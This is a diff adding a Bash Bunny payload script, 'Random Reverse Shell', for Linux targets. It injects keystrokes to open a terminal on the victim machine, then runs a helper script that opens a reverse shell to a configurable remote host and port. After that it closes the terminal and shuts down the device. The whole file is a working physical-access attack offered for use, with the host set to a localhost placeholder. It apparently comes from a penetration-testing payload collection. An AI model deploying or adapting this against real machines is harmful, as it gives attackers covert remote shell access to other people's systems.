@@ -1,0 +1,85 @@
+#!/bin/bash
+#
+# Title:            Random Reverse Shell
+# 
+# Description:
+#                   1) Checks the availability of binaries on the system.
+#                   2) Builds a list of possible payloads.
+#                   3) Performs one at random.
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Remote Access
+# Target:           Linux
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ==========
+# Ubuntu 20.04.4 LTS x86_64 (Xfce)
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Yellow quadruple blink .......................... STAGE4
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+readonly REMOTE_HOST="127.0.0.1"
+readonly REMOTE_PORT=54424
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+udisk mount
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 7000
+Q CTRL-ALT t
+Q DELAY 5000
+
+LED STAGE2
+
+Q STRING " cd /media/\${USER}/${BB_LABEL}/payloads/${SWITCH_POSITION}/"
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING " chmod +x ./random_reverse-shell.sh"
+Q ENTER
+Q DELAY 1500
+
+Q STRING " \$BASH ./random_reverse-shell.sh ${REMOTE_HOST} ${REMOTE_PORT}"
+Q ENTER
+Q DELAY 3000
+
+LED STAGE4
+
+Q STRING " exit"
+Q ENTER
+Q DELAY 1000
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+udisk unmount
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
